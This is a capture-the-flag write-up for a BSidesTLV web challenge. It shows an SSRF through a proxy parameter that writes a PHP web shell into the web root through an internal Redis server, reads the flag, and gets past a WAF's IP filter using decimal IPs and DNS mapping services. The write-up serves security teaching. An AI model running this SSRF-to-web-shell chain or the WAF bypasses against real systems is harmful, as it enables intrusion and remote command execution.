# WebProxy Nightmare
* Category: Web
* 400 Points
* Solved by the JCTF Team

## Description
> I have implemented WAF! but again all my data is leaking! HELP ME
> 
> URL: http://webproxy2.ctf.bsidestlv.com:8002/?csurl=https://gdpr-info.eu/
> 
> Note: please include the BSidesTLV cookie


## Solution

This is the follow-up challenge for [WebProxy](WebProxy.md).

Again, we start by changing the `csurl` parameter to localhost:
```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy_Nightmare# curl http://webproxy2.ctf.bsidestlv.com:8002/?csurl=http://127.0.0.1
```

As a response, we get a table with the following content:
| Service name: | IP Address: | Port: | 
| ------------- | ----------- | ----- |
| Redis | 10.42.106.242 | 6379 |
| NGINX | 10.42.249.43 | 80 |

We should probably try to see what happens when we run our original solution on the new server (after changing the IP address):

```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy_Nightmare# python3 solve.py
Sending request to: 'dict://10.42.106.242:6379/CONFIG SET dir /var/www/html'
Sending request to: 'dict://10.42.106.242:6379/CONFIG SET dbfilename shell.php'
Sending request to: 'dict://10.42.106.242:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
Sending request to: 'dict://10.42.106.242:6379/SAVE'
Sending request to: 'http://10.42.106.242:80/shell.php?command=cat $(find / -name flag.txt)'
BLOCKED BY WAF!
```

So there's a WAF here blocking access to the Redis server.

Turns out we can easily bypass it by changing the IP address.

One methods is using a decimal representation of the IP address:
```python
IP_ADDR = int(ipaddress.ip_address('10.42.106.242'))
```

Output:

```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy_Nightmare# python3 solve.py
Sending request to: 'dict://170552050:6379/CONFIG SET dir /var/www/html'
Sending request to: 'dict://170552050:6379/CONFIG SET dbfilename shell.php'
Sending request to: 'dict://170552050:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
Sending request to: 'dict://170552050:6379/SAVE'
Sending request to: 'http://170552050:80/shell.php?command=cat $(find / -name flag.txt)'
REDIS0006ş  flag!BsidesTLV2020{Y0u_4r3_A_Genius!!} mykey22<?php echo "\n"; system($_GET['command']); exit;?>ÿÙ�ÈŞÀRfİ
```

Another options is to use a DNS mapping service such as [1u.ms](1u.ms) or [nip.io](nip.io) that map a subdomain to an IP address based on the subdomain name:

```python
IP_ADDR = "make-10.42.106.242-rr.1u.ms"
IP_ADDR = "10.42.106.242.nip.io"
```

Output:
```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy_Nightmare# python3 solve.py
Sending request to: 'dict://make-10.42.106.242-rr.1u.ms:6379/CONFIG SET dir /var/www/html'
Sending request to: 'dict://make-10.42.106.242-rr.1u.ms:6379/CONFIG SET dbfilename shell.php'
Sending request to: 'dict://make-10.42.106.242-rr.1u.ms:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
Sending request to: 'dict://make-10.42.106.242-rr.1u.ms:6379/SAVE'
Sending request to: 'http://make-10.42.106.242-rr.1u.ms:80/shell.php?command=cat $(find / -name flag.txt)'
REDIS0006ş  flag!BsidesTLV2020{Y0u_4r3_A_Genius!!} mykey22<?php echo "\n"; system($_GET['command']); exit;?>ÿÙ�ÈŞÀRfİ


root@kali:/media/sf_CTFs/bsidestlv/WebProxy_Nightmare# python3 solve.py
Sending request to: 'dict://10.42.106.242.nip.io:6379/CONFIG SET dir /var/www/html'
Sending request to: 'dict://10.42.106.242.nip.io:6379/CONFIG SET dbfilename shell.php'
Sending request to: 'dict://10.42.106.242.nip.io:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
Sending request to: 'dict://10.42.106.242.nip.io:6379/SAVE'
Sending request to: 'http://10.42.106.242.nip.io:80/shell.php?command=cat $(find / -name flag.txt)'
REDIS0006þ  flag!BsidesTLV2020{Y0u_4r3_A_Genius!!}ÿKp¿’Ú“Êr
```

That wasn't such a nightmare after all.